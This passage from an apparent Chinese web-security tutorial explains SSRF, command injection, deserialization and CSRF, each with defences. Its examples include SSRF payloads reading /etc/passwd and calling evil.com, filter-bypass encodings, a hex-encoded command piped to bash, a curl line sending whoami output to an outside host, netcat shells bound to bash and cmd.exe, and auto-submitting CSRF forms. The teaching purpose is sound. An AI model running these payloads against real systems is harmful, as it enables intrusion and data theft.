prompt_">$</span><span class="language-bash">out .= <span class="string">&quot;Connection: Close\r\n\r\n&quot;</span>;</span> </span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">out .= <span class="string">&quot;\r\n&quot;</span>;</span> </span><br><span class="line"><span class="meta prompt_">fwrite($</span><span class="language-bash">fp, <span class="variable">$out</span>);</span> </span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">contents=<span class="string">&#x27;&#x27;</span>;</span> </span><br><span class="line">while (!feof($fp)) &#123; </span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">contents.= fgets(<span class="variable">$fp</span>, 1024);</span> </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta prompt_">fclose($</span><span class="language-bash">fp);</span> </span><br><span class="line">return $contents; </span><br><span class="line">&#125; </span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<h3 id="curl-exec"><a href="#curl-exec" class="headerlink" title="curl_exec()"></a><strong>curl_exec()</strong></h3><p>cURL这是另一个非常常见的实现，它通过 PHP获取数据。文件&#x2F;数据被下载并存储在“curled”文件夹下的磁盘中，并附加了一个随机数和“.txt”文件扩展名。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">if (isset($_POST[&#x27;url&#x27;]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash"><span class="built_in">link</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">curlobj = curl_init();</span></span><br><span class="line"><span class="meta prompt_">curl_setopt($</span><span class="language-bash">curlobj, CURLOPT_POST, 0);</span></span><br><span class="line"><span class="meta prompt_">curl_setopt($</span><span class="language-bash">curlobj,CURLOPT_URL,<span class="variable">$link</span>);</span></span><br><span class="line"><span class="meta prompt_">curl_setopt($</span><span class="language-bash">curlobj, CURLOPT_RETURNTRANSFER, 1);</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">result=curl_exec(<span class="variable">$curlobj</span>);</span></span><br><span class="line"><span class="meta prompt_">curl_close($</span><span class="language-bash">curlobj);</span></span><br><span class="line"><span class="meta prompt_"> </span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">filename = <span class="string">&#x27;./curled/&#x27;</span>.rand().<span class="string">&#x27;.txt&#x27;</span>;</span></span><br><span class="line"><span class="meta prompt_">file_put_contents($</span><span class="language-bash">filename, <span class="variable">$result</span>);</span> </span><br><span class="line">echo $result;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<p><strong>注意事项</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">一般情况下PHP不会开启fopen的gopher wrapper</span><br><span class="line">file_get_contents的gopher协议不能URL编码</span><br><span class="line">file_get_contents关于Gopher的302跳转会出现bug，导致利用失败</span><br><span class="line">curl/libcurl 7.43 上gopher协议存在bug(\%00截断) 经测试7.49 可用</span><br><span class="line">curl_exec() 默认不跟踪跳转，</span><br><span class="line">file_get_contents() file_get_contents支持php://input协议</span><br><span class="line"></span><br></pre></td></tr></table></figure>







<h2 id="URL伪协议"><a href="#URL伪协议" class="headerlink" title="URL伪协议"></a>URL伪协议</h2><p><strong>当我们发现SSRF漏洞后，首先要做的事情就是测试所有可用的URL伪协议</strong></p>
<p>file:&#x2F;&#x2F;&#x2F; 从文件系统中获取文件内容，如，file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd<br>dict:&#x2F;&#x2F; 字典服务器协议，访问字典资源，如，dict:&#x2F;&#x2F;&#x2F;ip:6739&#x2F;info：<br>sftp:&#x2F;&#x2F; SSH文件传输协议或安全文件传输协议<br>ldap:&#x2F;&#x2F; 轻量级目录访问协议<br>tftp:&#x2F;&#x2F; 简单文件传输协议<br>gopher:&#x2F;&#x2F; 分布式文档传递服务，可使用gopherus生成payload</p>
<h3 id="file"><a href="#file" class="headerlink" title="file"></a>file</h3><p>这种URL Schema可以尝试从文件系统中获取文件：</p>
<p><code>http://example.com/ssrf.php?url=file:///etc/passwd</code></p>
<p><code>http://example.com/ssrf.php?url=file:///C:/Windows/win.ini</code></p>
<p>如果该服务器阻止对外部站点发送HTTP请求，或启用了白名单防护机制，只需使用如下所示的URL Schema就可以绕过这些限制：</p>
<h3 id="dict"><a href="#dict" class="headerlink" title="dict"></a>dict</h3><p>这种URL Scheme能够引用允许通过DICT协议使用的定义或单词列表</p>
<p><a href="http://example.com/ssrf.php?dict://evil.com:1337/">http://example.com/ssrf.php?dict://evil.com:1337/</a><br>evil.com:$ nc -lvp 1337<br>Connection from [192.168.0.12] port 1337[tcp&#x2F;*]<br>accepted (family 2, sport 31126)CLIENT libcurl 7.40.0</p>
<h3 id="sftp"><a href="#sftp" class="headerlink" title="sftp"></a>sftp</h3><p>在这里，Sftp代表SSH文件传输协议（SSH File Transfer Protocol），或安全文件传输协议（Secure File Transfer Protocol），这是一种与SSH打包在一起的单独协议，它运行在安全连接上，并以类似的方式进行工作。</p>
<h3 id="gopher"><a href="#gopher" class="headerlink" title="gopher"></a><strong>gopher</strong></h3><p>Gopher是一种分布式文档传递服务。利用该服务，用户可以无缝地浏览、搜索和检索驻留在不同位置的信息。</p>
<p>SSRF漏洞利用中gopher可以说是万金油，因为可以使用gopher发送各种格式的请求包，这样变可以解决漏洞点不在GET参数的问题了。 </p>
<p>基本协议格式：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">URL:gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt; </span><br></pre></td></tr></table></figure>



<blockquote>
<p><a href="http://example.com/ssrf.php?url=http://attacker.com/gopher.php">http://example.com/ssrf.php?url=http://attacker.com/gopher.php</a> gopher.php (host it on acttacker.com):-&lt;?php header(‘Location: gopher:&#x2F;&#x2F;evil.com:1337&#x2F;_Hi%0Assrf%0Atest’);?&gt;<br>evil.com:# nc -lvp 1337<br>Listening on [0.0.0.0] (family 0, port1337)Connection from [192.168.0.12] port 1337[tcp&#x2F;*] accepted (family 2, sport 49398)Hissrftest</p>
</blockquote>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>1.可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息;</p>
<p>2.攻击运行在内网或本地的应用程序（比如溢出）;</p>
<p>3.对内网web应用进行指纹识别，通过访问默认文件实现;</p>
<p>4.攻击内外网的web应用，主要是使用get参数就可以实现的攻击（比如struts2，sqli等）;</p>
<p>5.利用file协议读取本地文件等。.</p>
<p>6.各个协议调用探针：http,file,dict,ftp,gopher等</p>
<p>http:192.168.64.144&#x2F;phpmyadmin&#x2F;<br>file:&#x2F;&#x2F;&#x2F;D:&#x2F;<a target="_blank" rel="noopener" href="http://www.txt/">www.txt</a><br>dict:&#x2F;&#x2F;192.168.64.144:3306&#x2F;info<br><a href="ftp://192.168.64.144/">ftp://192.168.64.144:21</a></p>
<h2 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h2><p><strong>1、限制为<a target="_blank" rel="noopener" href="http://www.xxx.com/">http://www.xxx.com</a> 域名时（利用@）</strong></p>
<blockquote>
<p>可以尝试采用http基本身份认证的方式绕过<br>如：<a target="_blank" rel="noopener" href="http://www.aaa.com%40www.bbb.com%40www.ccc.com%EF%BC%8C%E5%9C%A8%E5%AF%B9@解析域名中,不同的处理函数存在处理差异/">http://www.aaa.com@www.bbb.com@www.ccc.com，在对@解析域名中，不同的处理函数存在处理差异</a><br>在PHP的parse_url中会识别<a target="_blank" rel="noopener" href="http://www.ccc.com,而libcurl则识别为www.bbb.com./">www.ccc.com，而libcurl则识别为www.bbb.com。</a></p>
</blockquote>
<p><strong>2、采用短地址绕过</strong></p>
<blockquote>
<p>比如百度短地址<a target="_blank" rel="noopener" href="https://dwz.cn/">https://dwz.cn/</a></p>
</blockquote>
<p><strong>3.采用进制转换</strong></p>
<blockquote>
<p>127.0.0.1八进制：0177.0.0.1。十六进制：0x7f.0.0.1。十进制：2130706433.</p>
</blockquote>
<p><strong>4.利用特殊域名</strong></p>
<blockquote>
<p>原理是DNS解析。xip.io可以指向任意域名，即<br>127.0.0.1.xip.io，可解析为127.0.0.1<br>(xip.io 现在好像用不了了，可以找找其他的)</p>
</blockquote>
<p><strong>5.利用[::]</strong></p>
<blockquote>
<p>可以利用[::]来绕过localhost<br><a href="http://169.254.169.254>>http://[::169.254.169.254]">http://169.254.169.254&gt;&gt;http://[::169.254.169.254]</a></p>
</blockquote>
<p><strong>6.利用句号</strong></p>
<blockquote>
<p>127。0。0。1 &gt;&gt;&gt; 127.0.0.1</p>
</blockquote>
<p><strong>7、CRLF 编码绕过</strong></p>
<blockquote>
<p>%0d-&gt;0x0d-&gt;\r回车<br>%0a-&gt;0x0a-&gt;\n换行<br>进行HTTP头部注入</p>
<p>1 example.com&#x2F;?url&#x3D;<a target="_blank" rel="noopener" href="http://eval.com/%0d/%0aHOST:fuzz.com/%0d/%0a">http://eval.com\%0d\%0aHOST:fuzz.com\%0d\%0a</a> </p>
</blockquote>
<p><strong>8.利用封闭的字母数字</strong></p>
<blockquote>
<p>利用Enclosed alphanumerics<br>ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ &gt;&gt;&gt; example.com<br><a href="http://169.254.169.254>>>http://[::①⑥⑨｡②⑤④｡⑯⑨｡②⑤④]">http://169.254.169.254&gt;&gt;&gt;http://[::①⑥⑨｡②⑤④｡⑯⑨｡②⑤④]</a><br>List:<br>① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳<br>⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇<br>⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛<br>⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵<br>Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ<br>ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ<br>⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴<br>⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿</p>
</blockquote>
<h2 id="漏洞防御"><a href="#漏洞防御" class="headerlink" title="漏洞防御"></a>漏洞防御</h2><p>1）过滤192.168.0.0&#x2F;10.0.0.0&#x2F;172.16.0.0  localhost 私有地址、ipv6地址</p>
<p>2）过滤file:&#x2F;&#x2F;&#x2F;    、 dict:&#x2F;&#x2F;   、gopher:&#x2F;&#x2F;   、ftp:&#x2F;&#x2F;、 http:&#x2F;&#x2F;   https:&#x2F;&#x2F;    php:&#x2F;&#x2F;&#x2F;危险schema</p>
<p>3）白名单过滤</p>
<p>4）对返回的内容进行识别</p>
<h2 id="实战案例"><a href="#实战案例" class="headerlink" title="实战案例"></a>实战案例</h2><p><a href="./doc/11%E3%80%81SSRF%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF.docx">.&#x2F;doc&#x2F;11、SSRF攻击技术.docx</a></p>
<p><a href="./doc/SSRF%E6%94%BB%E5%87%BB.xmind">.&#x2F;doc&#x2F;SSRF攻击.xmind</a></p>
<h1 id="命令执行漏洞"><a href="#命令执行漏洞" class="headerlink" title="命令执行漏洞"></a>命令执行漏洞</h1><h2 id="漏洞介绍-1"><a href="#漏洞介绍-1" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><p>命令执行漏洞是指服务器没有对执行的命令进行过滤，用户可以随意执行系统命令，命令执行漏洞属于高危漏洞之一。</p>
<p>如PHP的命令执行漏洞主要是基于一些函数的参数过滤不足导致，可以执行命令的函数有system( )、exec( )、shell_exec( )、passthru( )、pcntl_execl( )、popen( )、proc_open( )等，当攻击者可以控制这些函数中的参数时，就可以将恶意的系统命令拼接到正常命令中，从而造成命令执行攻击<br>PHP执行命令是继承WebServer用户的权限，这个用户一般都有权限向Web目录写文件，可见该漏洞的危害性相当大</p>
<p><strong>漏洞原理</strong></p>
<p>​	应用程序有时需要调用一些执行系统命令的函数,如在PHP中，使用system、exec、shell_exec、passthru、popen、proc_popen等函数可以执行系统命令，当黑客能控制这些函数中的参数时，就可以将恶意的系统命令拼接到正常命令中，从而造成命令执行漏洞</p>
<p><strong>漏洞危害</strong></p>
<ul>
<li>继承Web服务器程序的权限，去执行系统命令或读写文件</li>
<li>反弹shell</li>
<li>控制整个网站，甚至控制整个服务器</li>
</ul>
<p><strong>漏洞产生的原因</strong></p>
<ol>
<li>没有对用户的输入进行过滤或者过滤不严格</li>
<li>系统漏洞造成的代码执行</li>
<li>调用第三方组件存在代码执行漏洞</li>
</ol>
<h2 id="可能存在漏洞的函数"><a href="#可能存在漏洞的函数" class="headerlink" title="可能存在漏洞的函数"></a>可能存在漏洞的函数</h2><h3 id="利用系统函数实现远程命令执行的函数"><a href="#利用系统函数实现远程命令执行的函数" class="headerlink" title="利用系统函数实现远程命令执行的函数"></a>利用系统函数实现远程命令执行的函数</h3><p>常见出现漏洞的地方：</p>
<p>​	只要带参数的地方都可能出现命令执行漏洞</p>
<p>​	常见的路由器、防火墙、入侵检测、自动化运维平台</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval（）、assert（）、preg_replace（）、call_user_func（）</span><br></pre></td></tr></table></figure>



<p>如果页面存在以上的函数并且对用户的输入没有做严格的过滤，就存在RCE命令执行漏洞，还有其他的函数</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ob_start（）、unserialize（）、creat_function（） 、usort（）、uasort（）、uksort（）、 array_filter（）、 array_reduce（）、 array_map（）</span><br></pre></td></tr></table></figure>

<h3 id="直接执行系统命令的函数"><a href="#直接执行系统命令的函数" class="headerlink" title="直接执行系统命令的函数"></a>直接执行系统命令的函数</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system（），exec（），shell_exec（），passthru（）， pcntl_exec（）， popen（）， proc_open（），反引号</span><br></pre></td></tr></table></figure>





<h2 id="命令拼接符"><a href="#命令拼接符" class="headerlink" title="命令拼接符"></a>命令拼接符</h2><p>命令拼接符是进行命令链接的基础，会使用命令拼接符才是利用命令执行漏洞的基础</p>
<h3 id="Windows常用命令拼接符"><a href="#Windows常用命令拼接符" class="headerlink" title="Windows常用命令拼接符"></a>Windows常用命令拼接符</h3><p><img src="/img/oldboy/image-20250309180405696.png" alt="image-20250309180405696"></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&amp;：拼接符两边只要有一个真就会执行</span><br><span class="line">&amp;&amp;：命令拼接符拼接多个命令时，会按照顺序执行，当遇到假的命令时会将终止执行。</span><br><span class="line">|：命令拼接符拼接多个命令时，只要有一个为假，其余都不执行；如果遇到为真则都执行，但是执行回显最后一个指令的运行结果。</span><br><span class="line">||：拼接多个指令时，按照顺序执行，执行完一个真的命令，则终止执行。</span><br></pre></td></tr></table></figure>





<h3 id="Linux的系统命令拼接符"><a href="#Linux的系统命令拼接符" class="headerlink" title="Linux的系统命令拼接符"></a>Linux的系统命令拼接符</h3><p>第一个是”&amp;”</p>
<p>​	‘&amp;’的作用是使命令在后台运行。只要在命令后面跟空格和&amp;，就可以在后台运行命令，终止方法是kill -s 进程号</p>
<p>第二个是”;”</p>
<p>​	就是<strong>分号</strong>，作用就是可以进行多条命令的无关联执行，每一条执行结果互不影响</p>
<p>第三个是”&amp;&amp;”</p>
<p>​	左边成功运行再执行右边</p>
<p>第四个是”||“</p>
<pre><code> 这个也跟windows一样，前面执行失败才执行后面
</code></pre>
<p>第五个是”()”</p>
<p>​	如果想执行几个命令，则需要用<strong>命令分隔符分号隔开每个命令</strong>，并使用圆括号()把所有命令组合起来</p>
<h2 id="绕过方式-1"><a href="#绕过方式-1" class="headerlink" title="绕过方式"></a>绕过方式</h2><h3 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h3><p>如果命令注入的网站过滤了某些分隔符，可以将分隔符编码后（url编码，base等）绕过</p>
<h3 id="八进制绕过"><a href="#八进制绕过" class="headerlink" title="八进制绕过"></a>八进制绕过</h3><blockquote>
<p>&#x2F;&#x2F;ls命令，这个编码后可以拼接</p>
<p>$(printf  “\154\163”)</p>
</blockquote>
<h3 id="十六进制字符绕过"><a href="#十六进制字符绕过" class="headerlink" title="十六进制字符绕过"></a>十六进制字符绕过</h3><blockquote>
<p>echo “636174202F6574632F706173737764” | xxd -r -p|bash</p>
</blockquote>
<p><img src="https://i-blog.csdnimg.cn/blog_migrate/1d24adfefdb0aa6926476286b1348d15.png#pic_center" alt="在这里插入图片描述"></p>
<h3 id="空格过滤"><a href="#空格过滤" class="headerlink" title="空格过滤"></a>空格过滤</h3><blockquote>
<p>Linux内置分隔符：${IFS},$IFS,$IFS$9</p>
</blockquote>
<p><img src="https://i-blog.csdnimg.cn/blog_migrate/d7debf88466e4517cd3056268b6a1d73.png#pic_center" alt="在这里插入图片描述"></p>
<p>利用重定向符<code>&lt;&gt;</code></p>
<p><img src="https://i-blog.csdnimg.cn/blog_migrate/db099bc3bbe9484a136f3ed58cb8a732.png#pic_center" alt="在这里插入图片描述"></p>
<h3 id="关键词绕过"><a href="#关键词绕过" class="headerlink" title="关键词绕过"></a>关键词绕过</h3><ul>
<li><p>通过拆分命令达到绕过的效果：<code>a=1;b=s;\$a\$b</code></p>
</li>
<li><p>空变量绕过：<code>cat fl$&#123;x&#125;ag</code> <code>cat tes$(z)t/flag</code></p>
</li>
<li><p>控制环境变量绕过：</p>
<p>先利用echo $PATH得到环境变量 &#x3D;&gt; “&#x2F;usr&#x2F;local&#x2F;….blablabla”<br>接着利用echo${PATH}得到长度<br>然后要哪个字符截取哪个字符就行<br>${PATH:0:1} &#x3D;&gt; ‘&#x2F;’<br>${PATH:1:1} &#x3D;&gt; ‘u’<br>${PATH:0:4} &#x3D;&gt; ‘&#x2F;usr’</p>
</li>
<li><p>空值绕过：<code>cat fl&quot;&quot;ag</code> <code>cat fl&#39;&#39;ag</code> <code>cat &quot;fl&quot;&quot;ag&quot;</code></p>
</li>
<li><p>反斜杠绕过：<code>ca\t flag</code> <code>l\s</code></p>
</li>
</ul>
<p><img src="/img/oldboy/35de9c0767cf41e5b1efe363b2ff5d77.png" alt="在这里插入图片描述"></p>
<h3 id="空变量"><a href="#空变量" class="headerlink" title="空变量"></a>空变量</h3><blockquote>
<p>$*和$@，$x(x 代表 1-9)，${x}(x&gt;&#x3D;10)：比如<code>ca$&#123;21&#125;t a.txt</code>表示<code>cat a.txt</code><br>在没有传入参数的情况下，这些特殊字符默认为空，如下:</p>
<ul>
<li>wh$1oami</li>
<li>who$@ami</li>
<li>whoa$*mi</li>
</ul>
</blockquote>
<p><img src="https://i-blog.csdnimg.cn/blog_migrate/4d4de863ab4dd7a2ffd8f9f36ed16568.png#pic_center" alt="在这里插入图片描述"></p>
<h3 id="花括号的用法"><a href="#花括号的用法" class="headerlink" title="花括号的用法"></a>花括号的用法</h3><blockquote>
<p>在Linux bash中还可以使用<code>&#123;OS_COMMAND,ARGUMENT&#125;</code>来执行系统命令<code>&#123;cat,flag&#125;</code></p>
</blockquote>
<p><img src="https://i-blog.csdnimg.cn/blog_migrate/6d23bc87860d7467f7a4ae12ce50b24a.png#pic_center" alt="在这里插入图片描述"></p>
<h3 id="无回显的命令执行"><a href="#无回显的命令执行" class="headerlink" title="无回显的命令执行"></a>无回显的命令执行</h3><p>可以通过curl命令将命令的结果输出到访问的url中：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl www.rayi.vip/`whoami`</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>在服务器日志中可看到：<code>xx.xx.xx.xx - - [12/Aug/2019:10:32:10 +0800] &quot;GET /root HTTP/1.1&quot; 404 146 &quot;-&quot; &quot;curl/7.58.0&quot;</code>，这样，命令的回显就能在日志中看到了</p>
<h3 id="读文件命令"><a href="#读文件命令" class="headerlink" title="读文件命令"></a>读文件命令</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sort|cut|xxd</span><br></pre></td></tr></table></figure>

<h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nc -L -p 9090-e cmd.exe (Windows)</span><br><span class="line"></span><br><span class="line">nc -l -p 9090-e /bin/bash (*nix)</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="防范措施"><a href="#防范措施" class="headerlink" title="防范措施"></a>防范措施</h2><p>1、各种框架、插件等位置都有可能出现命令执行，升级到新版本，多打补丁</p>
<p>2、关注行业最新安全动态，一旦爆发命令执行漏洞，迅速修复，避免造成更大影响</p>
<p>3、少用框架&#x2F;CMS</p>
<p>4、可以过滤一些符号从而减少一些危险</p>
<p>5、安全配置好php相关参数      </p>
<p>​	通过Php配置文件里面有个disable_functions &#x3D; 配置，这个禁止某些php函数， 服务器便是用这个来禁止php的执行命令函数。</p>
<p>6、升级中间件</p>
<p>7、严格控制传入变量，严禁使用魔法函数</p>
<h1 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h1><h2 id="基础知识-3"><a href="#基础知识-3" class="headerlink" title="基础知识"></a>基础知识</h2><p>序列化：把对象转换成字节序列的过程，即把对象转换为可以存储或传输的数据过程。</p>
<p>反序列化：八字节序列恢复成对象的过程，即把可以存储或传输的数据转化为对象的过程。</p>
<p><strong>漏洞产生的原因</strong></p>
<p>在身份验证，文件读写，数据传输等功能处，在未对反序列化接口做访问控制，未对序列化数据做加密和签名，加密密钥使用硬编码（如Shiro 1.2.4），使用不安全的反序列化框架库（如Fastjson 1.2.24）或函数的情况下，由于序列化数据可被用户控制，攻击者可以精心构造恶意的序列化数据（执行特定代码或命令的数据）传递给应用程序，在应用程序反序列化对象时执行攻击者构造的恶意代码，达到攻击者的目的</p>
<p><strong>产生原理</strong></p>
<p>serialize() 和 unserialize() 在 PHP内部实现上是没有漏洞的，之所以会产生反序列化漏洞是因为应用程序在处理对象、魔术函数以及序列化相关问题的时候导致的。 当传给 unserialize() 的参数可控时，那么用户就可以注入精心构造的 payload。当进行反序列化的时候就有可能会触发对象中的一些魔术方法，造成意想不到的危害。	</p>
<h2 id="防范措施-1"><a href="#防范措施-1" class="headerlink" title="防范措施"></a>防范措施</h2><ol>
<li><strong>更新和修补：</strong> 更新应用程序和库到最新版本，修补已知的漏洞。</li>
<li><strong>代码审计：</strong> 对代码进行安全审计，查找和修复潜在的反序列化问题。</li>
<li><strong>使用安全配置：</strong> 使用安全配置选项来限制反序列化操作。</li>
</ol>
<h1 id="CSRF客户端伪造请求"><a href="#CSRF客户端伪造请求" class="headerlink" title="CSRF客户端伪造请求"></a>CSRF客户端伪造请求</h1><h2 id="漏洞介绍-2"><a href="#漏洞介绍-2" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><p>CSRF：客户端请求伪造，是一种对恶意脚本的一种利用方式。</p>
<p><strong>简单来说：就是受害者在登录状态下，且服务端没有进行token和refer校验，攻击者利用CSRF漏洞构造恶意的连接诱导客户者点击，以受害者信息执行特定的操作。</strong></p>
<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p><img src="/img/oldboy/ef9eed0b772951bc593c5d9f7c348c84.jpeg" alt="在这里插入图片描述"></p>
<p><strong>攻击的本质</strong></p>
<ol>
<li>在CSRF攻击中，攻击者诱使用户的浏览器发起一个恶意请求，本质上是借助用户的凭证，以用户的身份去执行特定的操作。</li>
<li>在用户访问攻击者构造的恶意页面时，如果此时浏览器访问第三方站点带上了第三方的Cookie，那么第三方站点会认为这是一个已登录的用户的访问请求，浏览器就可顺利完成请求操作，因此该攻击方式叫做“跨站请求伪造”。</li>
<li>在整个攻击过程中，攻击者并没有拿到受害者的身份凭证，也拿不到操作后的返回结果(同源策略)，攻击者只是诱使受害者发出了一个特定的请求。</li>
</ol>
<h2 id="漏洞分类"><a href="#漏洞分类" class="headerlink" title="漏洞分类"></a>漏洞分类</h2><h3 id="GET类型"><a href="#GET类型" class="headerlink" title="GET类型"></a>GET类型</h3><p>GET类型的漏洞类似于XSS漏洞（只不过需要受害者在登陆状态）</p>
<p><strong>仅需要构造HTTP请求，诱导用户在登陆状态下点击，即可构造CSRF攻击</strong></p>
<p>简单示例：</p>
<p>银行站点A：它以GET请求来完毕银行转账的操作，如：</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="http://www.mybank.com/Transfer.php?toBankId=11&money=1000">http://www.mybank.com/Transfer.php?toBankId=11&amp;money=1000</a> </p>
</blockquote>
<p>攻击者构造：</p>
<blockquote>
<p>&lt;img src&#x3D;<a target="_blank" rel="noopener" href="http://www.mybank.com/Transfer.php?toBankId=113&money=1000%3E">http://www.mybank.com/Transfer.php?toBankId=113&amp;money=1000&gt;</a></p>
</blockquote>
<p>首先。你登录了银行站点A，然后访问危险站点B，这时你会发现你的银行账户少了1000块。</p>
<h3 id="POST类型"><a href="#POST类型" class="headerlink" title="POST类型"></a>POST类型</h3><p>这样的错误观点形成的原因主要在于，大多数CSRF攻击发起时，使用的HTML标签都是&lt;image&gt;、&lt;iframe&gt;、&lt;script&gt;等带“src”属性的标签，这类标签只能够发起一次GET请求，而不能发起POST请求。</p>
<p>而对于很多网站的应用来说，一些重要操作并未严格地区分GET与POST，攻击者可以使用GET来请求表单的提交地址。比如在PHP中，如果使用的是$_REQUEST，而非$_POST获取变量，则会存在这个问题。</p>
<p>例如：</p>
<blockquote>
<form action=" / register" id="register" method="post" >
<input type=text name="username" value="" />
<input type=password name="password" value="" />
<input type=submit name="submit" value="submit" />
</form>
</blockquote>
<p>攻击者可以尝试构造一个GET请求</p>
<blockquote>
<p>http: &#x2F;&#x2F;host&#x2F;register?username&#x3D;test&amp;password&#x3D;passwd</p>
</blockquote>
<p>若无法构造成功，可以通过Burp构造post类型的CSRF攻击：</p>
<blockquote>
<form action="http: / / www . a.com/register" id="register" method="post" ><input type=text name="username" value=""/>
<input type=password name="password" value=""/><input type=submit name="submit" value="submit"/></ form>
<script>
var f = document.getElementById ( "register");
f.inputs [0].value = "test";
f.inputs [1].value = "passwd" ;
f.submit ();
</script>
</blockquote>
<h2 id="漏洞挖掘-2"><a href="#漏洞挖掘-2" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h2><p>1、最简单的方法就是抓取一个正常请求的数据包，如果没有Referer字段和token，那么极有可能存在CSRF漏洞。</p>
<p>2、如果有Referer字段，但是去掉Referer字段后再重新提交，如果该提交还有效，那么基本上可以确定存在CSRF漏洞。</p>
<p>3、随着对CSRF漏洞研究的不断深入，不断涌现出一些专门针对CSRF漏洞进行检测的工具，如CSRFTester，CSRF Request Builder等。以CSRFTester工具为例，CSRF漏洞检测工具的测试原理如下:</p>
<p>使用CSRFTester进行测试时，首先需要抓取我们在浏览器中访问过的所有链接以及所有的表单等信息，然后通过在CSRFTester中修改相应的表单等信息，重新提交，这相当于一次伪造客户端请求。</p>
<p>如果修改后的测试请求成功被网站服务器接受，则说明存在CSRF漏洞，当然此款工具也可以被用来进行CSRF攻击。</p>
